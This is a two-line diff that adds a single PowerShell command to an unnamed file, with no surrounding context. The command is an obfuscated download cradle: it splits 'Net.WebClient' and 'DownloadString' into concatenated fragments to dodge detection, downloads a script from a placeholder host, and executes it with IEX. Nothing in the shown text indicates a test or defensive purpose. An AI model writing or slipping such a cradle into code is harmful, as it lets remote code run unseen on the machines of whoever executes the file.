@@ -1,0 +1,2 @@
+$w = New-Object ('Net.We'+'bClient'); $u = $w.('Download'+'String')('http://example.invalid/x'); IEX $u
+
